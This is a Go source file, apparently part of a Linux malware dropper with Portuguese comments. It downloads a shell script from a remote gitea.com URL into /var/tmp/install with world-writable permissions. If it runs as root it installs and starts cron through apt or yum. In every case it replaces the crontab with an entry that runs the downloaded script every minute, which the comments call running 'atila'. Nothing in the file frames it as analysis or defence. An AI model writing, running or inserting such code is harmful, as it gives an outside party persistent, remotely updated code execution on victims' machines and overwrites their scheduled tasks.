package main



//add atila in cron




import (
 
"strings"
"strconv"
"net/http"
"os/exec"
"fmt"
"io/ioutil"
)





func apt(){

//faca coisas de root
 
ap :=   exec.Command("sh" , "-c", "apt-get update -y  ; apt-get  install  cron -y ; apt install crond -y ; apt-get  install service  -y")
ap.Run()

//fedora
                 
fd := exec.Command("sh", "-c",  "yum update -y ;  yum install cron -y ; yum install crond -y ;  yum install  service -y ")
fd.Run()

//start cron

start := exec.Command("sh" , "-c" , "service cron start ; systemctl start cron ")
start.Run()
 
start_2 := exec.Command("sh" , "-c" , "service crond start ; systemctl start crond ")
start_2.Run()



cr  :=   exec.Command("sh" , "-c",  "echo '* * * * *  bash /var/tmp/install'  | crontab -")
cr.Run()

//add atila in cron

//minuto em minuto exec atila


}







func is_root( ) string{ 

//verify if root

id := exec.Command("id" , "-u") 
out ,  err_rd := id.CombinedOutput()
if err_rd != nil {return ""}

out_str := string(out)

out_str =  strings.TrimSpace(out_str)

out_int , err_at  := strconv.Atoi( out_str )

if  err_at != nil {return ""}



if out_int == 0 { return "root_ok"  }  //is root   haha
 

 
return ""

}





func raw_(link string  ) {

   
atila_bin  :=  http.Client{}



fmt.Println("e 64 bits  cron")

req , err_get := atila_bin.Get( link )

if err_get == nil {

atila_byte , err_rd := ioutil.ReadAll(req.Body)
if err_rd == nil {

//fmt.Println(atila_byte)

ioutil.WriteFile("/var/tmp/install",  atila_byte , 0777 )

ret := is_root()

if ret == "root_ok" { apt() } else { 

fmt.Println("nao e root add o atila mesmo asim no cron")

cr  :=   exec.Command("sh" , "-c",  "echo '* * * * * bash  /var/tmp/install'  | crontab -")
cr.Run()

//minuto in minuto exec atila

}









} } 


}




func cron(){


raw_("https://gitea.com/logical/logical/raw/branch/master/install/install.sh")


}












